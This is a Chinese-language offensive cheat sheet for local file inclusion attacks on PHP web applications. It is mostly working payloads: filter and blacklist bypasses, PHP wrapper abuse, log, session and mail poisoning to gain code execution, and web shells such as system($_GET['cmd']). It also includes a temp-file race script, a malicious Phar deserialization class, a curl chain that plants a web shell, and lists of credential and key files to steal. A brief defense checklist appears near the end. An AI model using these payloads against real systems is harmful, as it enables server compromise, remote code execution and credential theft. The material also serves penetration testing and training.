# LFI（本地文件包含）绕过秘笈

## 快速查找：遇到保护机制时的绕过索引

| 保护机制 | 绕过技巧章节 | 关键技术 |
|---------|-------------|---------|
| **协议黑名单**（禁用php://、file://） | [协议黑名单绕过](#1-协议黑名单绕过) | 大小写混淆、URL编码、使用其他协议（data://、phar://、zip://） |
| **路径遍历过滤**（禁用 ../） | [关键字过滤绕过](#2-关键字过滤绕过) | 双写绕过（....//）、编码（%2e%2e/）、替换型过滤利用 |
| **点号过滤**（禁用 .） | [点号过滤绕过](#3-点号过滤绕过) | 绝对路径、URL编码（%2e）、双重编码 |
| **斜杠过滤**（禁用 /） | [斜杠过滤绕过](#4-斜杠过滤绕过) | Windows反斜杠、URL编码（%2f、%5c） |
| **白名单目录限制** | [路径遍历绕过白名单](#1-路径遍历绕过白名单) | 路径遍历（../）、符号链接、点号组合 |
| **白名单扩展名检查** | [白名单扩展名绕过](#4-白名单扩展名绕过空字节双扩展名) | 空字节截断、尾随字符、双扩展名 |
| **realpath() 验证** | [白名单目录绕过](#5-白名单目录绕过realpath前后) | 竞争条件、符号链接、realpath前包含 |
| **basename() 验证** | [basename绕过](#6-basename绕过) | 路径注入绕过basename提取 |
| **正则表达式过滤** | [Regex绕过](#regex绕过正则表达式缺陷) | 弱正则、未锚点、未转义特殊字符 |
| **特定路径黑名单** | [路径黑名单绕过](#6-路径黑名单绕过) | 点号斜杠、双斜杠、相对路径 |
| **协议部分禁用** | [协议过滤不完整](#5-协议过滤不完整) | 使用未禁用的协议（data://、phar://、expect://） |
| **大小写敏感检查** | [大小写绕过](#大小写绕过案例不敏感系统) | Windows环境大小写混淆 |
| **多层URL解码** | [多层编码绕过](#多层编码绕过) | 双重/三重URL编码、Unicode编码 |
| **死亡代码保护** | [php://filter 写入绕过死亡代码](#phpfilter-写入绕过死亡代码) | Base64、ROT13、iconv转换器 |
| **无文件写入权限** | [php://input](#phpinput---直接执行post数据) | 使用php://input直接执行POST数据 |
| **无直接文件操作** | [日志注入](#日志注入--包含)、[Session包含](#session包含--上传) | 通过日志、Session、邮件等间接写入 |

## PHP 伪协议利用

### php://filter - 文件读取和过滤
```php
// 基础读取（Base64避免被解析）
php://filter/convert.base64-encode/resource=index.php

// 链式转换器
php://filter/convert.base64-encode|convert.base64-encode/resource=file.php

// 其他编码：ROT13、quoted-printable、iconv字符转换
php://filter/read=string.rot13/resource=file.php
php://filter/convert.iconv.utf-8.utf-16/resource=file.php

// 多层嵌套绕过检测
php://filter/zlib.deflate|convert.base64-encode/resource=file.php
php://filter/read=string.toupper|string.tolower|string.rot13/resource=file.php
```

### php://input - 直接执行POST数据
```php
// 包含php://input，POST body中放置PHP代码
include($_GET['file']); // file=php://input

POST数据:
<?php system($_GET['cmd']); ?>

// 优势：无需文件写入权限，直接RCE
```

### data:// - 数据流协议
```php
// Base64编码PHP代码
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

// 直接明文（需URL编码）
data://text/plain,<?php system('id');?>

// 绕过协议检测：使用data://代替php://
```

### expect:// - 命令执行（需安装expect扩展）
```php
expect://id
expect://whoami
expect://ls

// 直接执行系统命令，无需PHP代码
```

### file:// 协议读取本地文件
```php
file:///etc/passwd
file:///var/www/html/config.php

// Windows路径
file://C:/Windows/System32/drivers/etc/hosts
file://C:\boot.ini
```

### zip:// 和 phar:// - 协议包含执行
```php
// 上传压缩包，通过协议包含执行内部PHP代码
zip://upload/test.png%23shell.php
phar://archive.phar/file.txt

// 绕过原理：即使被重命名为图片，仍可协议包含执行

// Phar反序列化攻击
phar://malicious.phar/trigger.txt
// 触发__destruct()或__wakeup()魔术方法

// Zip协议绕过扩展名检测
zip://shell.jpg#shell.php
zip://upload.png#../../../shell.php
```

### compress.zlib:// | compress.bzip2:// - 压缩流处理
```php
// 处理压缩流和编码转换（绕过协议黑名单）
compress.zlib://file.txt.gz
compress.bzip2://file.txt.bz2

// 结合php://filter使用
php://filter/zlib.deflate/resource=file.php
php://filter/bzip2.compress/resource=config.php
```

### glob:// - 目录遍历（某些框架）
```php
// 列出目录内容
glob:///var/www/html/*
glob://images/*.php

// 用于信息泄露，探测文件结构
```

### 协议大小写绕过
```php
// 绕过协议黑名单检测
PHP://filter/resource=file.php
PhP://input
pHp://filter/convert.base64-encode/resource=index.php
DATA://text/plain,<?php phpinfo();?>
```

## 目录遍历编码

### 基础路径遍历
```
../                      # 基础遍历
..%2f                   # /的URL编码
..%5c                   # \的URL编码（Windows）
%2e%2e%2f              # ../完全URL编码
..%252f                # 双URL编码
....//                 # 替换后绕过（....// → ..// 后执行）
```

### Unicode 编码绕过
```
..%c0%af               # Unicode编码的 /
..%c1%9c               # UTF-8 overlong编码
%c0%ae%c0%ae/          # Unicode编码 ../
%e0%80%ae%e0%80%ae/    # UTF-8 三字节编码
```

### 16位Unicode编码
```
%u002e%u002e%u2215     # 16位Unicode: ../
%u2216                 # 反斜杠的Unicode
%uEFC8                 # 其他路径分隔符变体
```

### 双写绕过（针对替换型过滤）
```
....//                 # 过滤后变为 ../
..././                 # 过滤后变为 ../
....\\/                # Windows环境
..//////               # 多余斜杠（部分系统忽略）
..\\..\\..\\..\\..\\..\\ # Windows双斜杠
```

### 大小写混淆（Windows/案例不敏感系统）
```
..%5C                  # 大写十六进制
..%5c                  # 小写十六进制
%2E%2E/                # 点的编码变体
```

### 空字节注入（PHP < 5.3.4）
```
../../etc/passwd%00.jpg    # 空字节截断，绕过扩展名检查
config.php%00              # 截断后续字符
file.txt%00.png            # 伪装成图片
```

### 换行符和特殊字符
```
..%0a/                 # 换行符 \n
..%0d/                 # 回车符 \r
..%09/                 # Tab符
..%20/                 # 空格
```

## 文件包含技术

### 日志文件包含
```php
// 常见路径
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/php_errors.log
/var/log/php-fpm/error.log
/var/log/syslog
/var/log/auth.log
/var/log/mail.log
/var/log/vsftpd.log
/usr/local/apache2/logs/access.log
C:\xampp\apache\logs\access.log    # Windows
C:\wamp\logs\apache_error.log      # Windows

// 注入点：User-Agent、Referer、Request-Path、Cookie
User-Agent: <?php system('id');?>
Referer: <?php phpinfo();?>
X-Forwarded-For: <?php system('whoami');?>
Cookie: session=<?php @eval($_POST['cmd']);?>

// 优势：日志路径通常不含被过滤字符（如:、.、php）

// SSH日志注入
ssh '<?php system($_GET["cmd"]); ?>'@target.com
# 失败的SSH登录会记录到 /var/log/auth.log
```

### Session文件包含
```php
// 默认位置
/tmp/sess_{PHPSESSID}
/var/lib/php/sessions/sess_{PHPSESSID}
/var/lib/php5/sess_{PHPSESSID}
C:\Windows\Temp\sess_{PHPSESSID}

// PHP_SESSION_UPLOAD_PROGRESS机制（PHP 5.4+）
// 1. 构造文件上传，PHP_SESSION_UPLOAD_PROGRESS字段写入PHP代码
// 2. 使用固定PHPSESSID Cookie
// 3. 包含 /tmp/sess_{PHPSESSID}

POST /upload.php HTTP/1.1
Cookie: PHPSESSID=test123
Content-Type: multipart/form-data; boundary=----Web

------Web
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

<?php system('cat flag.php');?>
------Web--

// 然后包含：/tmp/sess_test123

// 竞争条件：Session自动清理机制，需快速请求
# 脚本1：持续上传维持session
# 脚本2：包含session文件执行
```

### 临时文件包含
```php
// 位置识别
/tmp/php{随机字符串}
/tmp/phpXXXXXX                # 6个随机字符
/var/tmp/{process_id}
/tmp/upload_{filename}
/tmp/phpupload_{random}

// 竞争条件利用：在unlink()前包含临时文件
$tmpfile = tempnam('/tmp', 'upload_');
file_put_contents($tmpfile, $data);
// 攻击：快速包含$tmpfile，在unlink之前完成

// LFI-RCE via temp file race
# 上传PHP文件，在被删除前包含执行
```

### 环境变量/控制符号包含
```php
// /proc/self/environ 包含环境变量
include('/var/www/uploads/../../../proc/self/environ');

// 注入恶意环境变量，再通过日志包含执行
User-Agent: <?php system('id'); ?>
# 该值会出现在 /proc/self/environ

// /proc/self/cmdline - 进程命令行
/proc/self/cmdline

// /proc/self/fd/* - 文件描述符
/proc/self/fd/0    # stdin
/proc/self/fd/1    # stdout
/proc/self/fd/2    # stderr
/proc/self/fd/3    # 可能是日志文件
```

### 邮件文件包含
```php
// 邮件日志路径
/var/mail/username
/var/spool/mail/username
/var/log/mail.log

// 通过SMTP发送恶意邮件
telnet target.com 25
HELO attacker.com
MAIL FROM: attacker@evil.com
RCPT TO: www-data@target.com
DATA
<?php system($_GET['cmd']); ?>
.
QUIT

// 包含邮件文件执行代码
```

### 数据库文件包含
```php
// MySQL慢查询日志
/var/log/mysql/slow-query.log

// 通过SQL注入写入PHP代码
SELECT '<?php system($_GET["cmd"]); ?>' into outfile '/var/www/html/shell.php';

// 包含MySQL日志
include('/var/log/mysql/slow-query.log');
```

### 上传文件包含
```php
// 上传头像/图片，包含PHP代码
// 绕过：
1. 在图片文件末尾追加PHP代码
2. 使用GIF头：GIF89a<?php system('id');?>
3. 在EXIF注释中注入代码

// 包含上传的文件
include('/var/www/html/uploads/avatar.jpg');
```

## php://filter 写入绕过死亡代码

### Base64解码过滤器
```php
// 死亡代码：<?php die('大佬别秀了');?>
// Base64编码恶意代码并写入
file_put_contents('php://filter/write=convert.base64-decode/resource=shell.php',
    'PD9waHAgc3lzdGVtKCdscycpOw==');

// URL编码绕过（:、.被过滤）
php%3a//filter/write=convert.base64-decode/resource=shell.php
```

### ROT13 和 iconv 过滤器
```php
// ROT13：<?php system('ls');?> → <?cuc flfgrz('yf');?>
file_put_contents('php://filter/write=string.rot13/resource=shell.php',
    '<?cuc flfgrz(\\'yf\\');?>');

// iconv转换：改变字节顺序破坏死亡代码
file_put_contents('php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php',
    '恶意代码');
```

## 模板引擎 LFI

### EJS/Pug/Handlebars
```javascript
// 危险：直接拼接模板路径
res.render(req.query.template);  // /../../etc/passwd.ejs

// 安全：白名单验证
const allowed = ['home', 'about', 'contact'];
if (!allowed.includes(req.query.template)) abort(403);
res.render(req.query.template);
```

### Velocity/FreeMarker
```java
// 危险：动态包含
Template tpl = velocityEngine.getTemplate(userInput);

// 安全：限制加载路径
configuration.setDirectoryForTemplateLoading(
    new File("/path/to/templates")
);
```

## 编码和过滤绕过

### 白名单绕过技巧

#### 1. 路径遍历绕过白名单
```php
// 白名单：只允许 templates/ 目录
$allowed_dir = '/var/www/templates/';
$file = $allowed_dir . $_GET['template'];

// 绕过：使用 ../ 遍历到白名单外
?template=../../../etc/passwd
// 结果：/var/www/templates/../../../etc/passwd → /etc/passwd
```

#### 2. 符号链接绕过
```bash
# 在白名单目录内创建符号链接
ln -s /etc/passwd /var/www/templates/config.txt

# 包含：
?file=config.txt  # 实际读取 /etc/passwd
```

#### 3. 点号和斜杠组合
```
file=./index.php           # 当前目录
file=././index.php         # 多重当前目录
file=.///index.php         # 多余斜杠
```

#### 4. 白名单扩展名绕过（空字节、双扩展名）
```php
// 白名单：只允许 .php 扩展名
if (substr($file, -4) !== '.php') die('Invalid');

// 绕过（PHP < 5.3.4）：
?file=shell.php%00.jpg     # 空字节截断
?file=shell.php%00         # 空字节截断

// 绕过：利用 basename 或 pathinfo 的弱检查
?file=shell.php/.          # basename 返回 shell.php
?file=shell.php%20         # 尾随空格（Windows）
```

#### 5. 白名单目录绕过（realpath前后）
```php
// 弱检查：先拼接再验证
$file = $_GET['file'];
$path = '/var/www/templates/' . $file;
if (strpos(realpath($path), '/var/www/templates/') !== 0) die();

// 绕过：符号链接或在realpath执行前包含
// 竞争条件：在realpath校验前快速包含
```

#### 6. basename绕过
```php
// 白名单：只允许指定文件名
$allowed = ['index', 'about', 'contact'];
if (!in_array(basename($_GET['file']), $allowed)) die();

// 绕过：basename会去除路径
?file=../../../etc/passwd/../../../var/www/html/index
// basename 返回 'index'，通过白名单，但实际路径包含 /etc/passwd
```

### 黑名单绕过技巧

#### 1. 协议黑名单绕过
```php
// 黑名单：禁用 php://
if (strpos($file, 'php://') !== false) die();

// 绕过：
pHp://filter/resource=file.php      # 大小写混淆
php%3a//filter/resource=file.php    # URL编码冒号
data://text/plain,<?php code?>      # 使用其他协议
phar://file.phar/shell.php          # Phar协议
```

#### 2. 关键字过滤绕过
```php
// 黑名单：过滤 '../'
$file = str_replace('../', '', $_GET['file']);

// 绕过：
....//                              # 替换后变为 ../
..././                              # 替换后变为 ../
.....///                            # 替换后变为 .//
```

#### 3. 点号过滤绕过
```php
// 黑名单：过滤 '.'
$file = str_replace('.', '', $_GET['file']);

// 绕过：
// 使用绝对路径（无需点号）
/etc/passwd
/var/www/html/config.php

// 使用编码
%2e%2e/                             # . 的URL编码
%252e%252e/                         # 双重编码
```

#### 4. 斜杠过滤绕过
```php
// 黑名单：过滤 '/'
$file = str_replace('/', '', $_GET['file']);

// 绕过：
// Windows反斜杠
..\..\..\..\etc\passwd

// URL编码
..%2f..%2f..%2fetc%2fpasswd        # / 的URL编码
..%5c..%5c..%5c                    # \ 的URL编码
```

#### 5. 协议过滤不完整
```php
// 黑名单：只禁止 file://、php://
if (preg_match('/^(file|php):\/\//i', $file)) die();

// 绕过：使用其他协议
data://text/plain,<?php code?>     # data协议
phar://archive.phar/shell.php      # phar协议
zip://upload.zip#shell.php         # zip协议
expect://ls                        # expect协议
```

#### 6. 路径黑名单绕过
```php
// 黑名单：禁止访问 /etc/passwd
if (strpos($file, '/etc/passwd') !== false) die();

// 绕过：
/etc/./passwd                      # 当前目录符号
/etc//passwd                       # 双斜杠
/etc/passwd/.                      # 尾随点号
/etc/default/../passwd             # 相对路径
/./etc/passwd                      # 前置当前目录
```

### 多层编码绕过
```php
// 单层编码
..%2f                              # / 的URL编码

// 双层编码
..%252f                            # %2f 再次编码

// 三层编码
..%25252f                          # %252f 再次编码

// HTML实体编码
..&#47;                            # / 的HTML实体

// Unicode编码
..%c0%af                           # UTF-8 overlong
..%e0%80%af                        # UTF-8 三字节编码
```

### 字符串替换绕过
```php
// 思路：检查协议是否包含被过滤字符
// 过滤了"php"，使用 phar://、zip://
// 过滤了"php"，使用URL编码：php%3a//

$protocol = "phar://archive.phar/file.txt";
if (strpos($protocol, "php") === false) {
    // 不包含被过滤字符，可使用
}

// 替换型过滤的双写绕过
str_replace('../', '', $file);
// 攻击：....//  → 替换后变为 ../
```

### Regex绕过（正则表达式缺陷）
```php
// 弱正则：只匹配开头
if (preg_match('/^\.\.\//', $file)) die();

// 绕过：在前面添加字符
?file=a/../../../etc/passwd        # 不以 ../ 开头

// 弱正则：未使用锚点
if (preg_match('/\.php/', $file)) die();

// 绕过：
?file=test.php5                    # 不完全匹配
?file=test.phtml                   # 其他PHP扩展名
?file=test.phps                    # PHP源码格式

// 弱正则：未转义特殊字符
if (preg_match('/file\.php/', $file)) die();

// 绕过：
?file=fileXphp                     # . 在正则中表示任意字符
```

### 大小写绕过（案例不敏感系统）
```
// Windows环境
C:\Windows\System32
c:\WiNdOwS\sYsTeM32
C:\WINDOWS\system32

// Apache配置不当
/Admin/config.php                  # 本应是 /admin/
/INDEX.PHP                         # 本应是 /index.php
```

### 路径标准化缺陷
```php
// 某些系统会标准化路径，可利用此特性
/var/www/html/../../../etc/passwd  → /etc/passwd
/./etc/passwd                      → /etc/passwd
/etc//passwd                       → /etc/passwd
/etc/./passwd                      → /etc/passwd
```

## RCE via LFI

### 日志注入 + 包含
```
1. 访问应用，在User-Agent中注入PHP代码
2. 代码被写入日志文件
3. 通过LFI包含日志文件执行代码

GET / HTTP/1.1
User-Agent: <?php system('id');?>

include('/var/log/apache2/access.log');
```

### Session包含 + 上传
```
1. 上传文件时，使用PHP_SESSION_UPLOAD_PROGRESS
2. 内容被写入Session文件
3. 包含Session文件执行代码
```

## 快速定位

**关键词**：
- include/require 无白名单
- 直接拼接 GET/POST
- 未验证 file 参数
- 多步骤文件操作
- 模板加载器接受用户路径

**测试顺序**：
1. 基础遍历：`../../../etc/passwd`
2. URL编码：`%2e%2e%2fetc%2fpasswd`
3. PHP协议：`php://filter/convert.base64-encode/resource=index.php`
4. File协议：`file:///etc/passwd`
5. Zip/Phar（需特定条件）
6. 日志注入：User-Agent等注入代码，再通过LFI包含

## 防御检查清单

- 白名单验证文件路径
- 禁用危险协议（php://、data://、phar://、zip://）
- basename() 移除路径信息
- 验证扩展名和MIME类型
- 使用 realpath() 完整规范化路径后验证
- 禁用 allow_url_include、allow_url_fopen
- 限制include/require的加载路径
- 定期审计所有include/require点

## 常见敏感文件路径

### Linux/Unix 系统文件
```
/etc/passwd                    # 用户账户信息
/etc/shadow                    # 密码哈希（需root）
/etc/hosts                     # 主机映射
/etc/hostname                  # 主机名
/etc/issue                     # 系统版本
/etc/group                     # 用户组
/etc/crontab                   # 定时任务
/etc/profile                   # 系统环境
/etc/bashrc                    # Bash配置
/etc/resolv.conf               # DNS配置
/etc/mysql/my.cnf              # MySQL配置
/etc/apache2/apache2.conf      # Apache配置
/etc/nginx/nginx.conf          # Nginx配置
/etc/ssh/sshd_config           # SSH配置
/etc/php/*/php.ini             # PHP配置
/etc/redis/redis.conf          # Redis配置
/root/.bash_history            # Root命令历史
/root/.ssh/id_rsa              # SSH私钥
/root/.ssh/authorized_keys     # SSH授权密钥
/home/user/.bash_history       # 用户命令历史
/home/user/.ssh/id_rsa         # 用户SSH私钥
```

### 日志文件
```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
/var/log/syslog
/var/log/messages
/var/log/secure
/var/log/mysql/error.log
/var/log/mysql.log
/var/log/xferlog                # FTP传输日志
/var/log/btmp                   # 失败登录尝试
/var/log/wtmp                   # 登录记录
/var/log/lastlog                # 最后登录
```

### Web应用配置和敏感文件
```
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/.env               # Laravel/框架环境变量
/var/www/html/wp-config.php      # WordPress配置
/var/www/html/configuration.php   # Joomla配置
/var/www/html/includes/config.php
/var/www/html/application/config/database.php  # CodeIgniter
/var/www/html/.git/config        # Git配置
/var/www/html/.svn/entries       # SVN信息
/var/www/html/composer.json      # PHP依赖
/var/www/html/package.json       # Node.js依赖
```

### Proc文件系统
```
/proc/self/environ              # 环境变量
/proc/self/cmdline              # 命令行参数
/proc/self/stat                 # 进程状态
/proc/self/status               # 进程详细状态
/proc/self/fd/0                 # 标准输入
/proc/self/fd/1                 # 标准输出
/proc/self/fd/2                 # 标准错误
/proc/self/fd/*                 # 打开的文件描述符
/proc/self/cwd                  # 当前工作目录
/proc/version                   # 内核版本
/proc/cpuinfo                   # CPU信息
/proc/meminfo                   # 内存信息
/proc/net/tcp                   # TCP连接
/proc/net/fib_trie              # 路由表
```

### Windows系统文件
```
C:\boot.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\Windows\repair\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\win.ini
C:\Windows\system.ini
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\wamp\bin\apache\apache2.4.X\conf\httpd.conf
C:\inetpub\wwwroot\web.config
C:\Users\Administrator\Desktop\
```

### 数据库凭证文件
```
/var/www/html/.env
/var/www/html/config/database.yml
/var/www/html/application/config/database.php
/var/www/html/sites/default/settings.php  # Drupal
/var/www/html/config/config.inc.php       # phpMyAdmin
```

## 实战技巧与工具

### 快速测试Payload
```bash
# 基础测试
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd

# 协议测试
php://filter/convert.base64-encode/resource=index.php
php://input  （配合POST数据）
data://text/plain,<?php phpinfo();?>
file:///etc/passwd

# 日志注入测试（先注入再包含）
User-Agent: <?php system($_GET['cmd']); ?>
然后包含：/var/log/apache2/access.log

# Session包含测试
1. 设置Cookie: PHPSESSID=hacker123
2. 上传带有恶意代码的文件
3. 包含：/tmp/sess_hacker123
```

### 自动化工具
```bash
# LFISuite - LFI扫描和利用工具
git clone https://github.com/D35m0nd142/LFISuite.git
python lfisuite.py

# Kadimus - LFI扫描和利用
git clone https://github.com/P0cL4bs/Kadimus.git
./kadimus -u 'http://target.com/page.php?file='

# Burp Suite - 手动测试
# 使用Intruder模块进行路径遍历测试
# 使用Repeater进行协议测试
```

### 编码工具
```python
# URL编码
import urllib.parse
payload = "../../../etc/passwd"
encoded = urllib.parse.quote(payload)
double_encoded = urllib.parse.quote(encoded)

# Base64编码（用于php://filter）
import base64
code = "<?php system('ls'); ?>"
encoded = base64.b64encode(code.encode()).decode()
print(f"php://filter/convert.base64-decode/resource=data:text/plain;base64,{encoded}")
```

### 漏洞验证脚本
```python
import requests

# 测试LFI漏洞
url = "http://target.com/page.php"
payloads = [
    "?file=../../../etc/passwd",
    "?file=....//....//....//etc/passwd",
    "?file=php://filter/convert.base64-encode/resource=index.php",
]

for payload in payloads:
    response = requests.get(url + payload)
    if "root:" in response.text or "PD9waHAgL" in response.text:
        print(f"[!] Vulnerable: {payload}")
```

## 高级利用链

### PHP临时文件竞争 + 包含RCE
```python
# 脚本1：持续上传维持临时文件
import requests
import threading

def upload_file():
    while True:
        files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
        requests.post('http://target.com/upload.php', files=files)

threading.Thread(target=upload_file, daemon=True).start()

# 脚本2：快速包含临时文件
import os
for i in range(1000):
    try:
        response = requests.get(f'http://target.com/page.php?file=/tmp/phpXXXXXX')
        if 'system' in response.text:
            print(f"[!] RCE achieved at /tmp/phpXXXXXX")
            break
    except:
        pass
```

### Phar反序列化 + LFI
```php
// 1. 创建恶意Phar文件
<?php
class Evil {
    public function __destruct() {
        system($_GET['cmd']);
    }
}

$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->addFromString('test.txt', 'test');
$phar->setMetadata(new Evil());
$phar->stopBuffering();
?>

// 2. 上传evil.phar并重命名为evil.jpg
// 3. 通过LFI触发：phar://uploads/evil.jpg/test.txt
```

### 日志注入 + LFI 完整利用
```bash
# 步骤1：在日志中注入PHP代码
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 步骤2：包含日志文件执行命令
curl "http://target.com/page.php?file=/var/log/apache2/access.log&cmd=id"

# 步骤3：写入WebShell
curl "http://target.com/page.php?file=/var/log/apache2/access.log&cmd=echo%20'<?php%20@eval(\$_POST[x]);?>'%20>%20shell.php"

# 步骤4：访问WebShell
curl -X POST -d "x=phpinfo();" http://target.com/shell.php
```
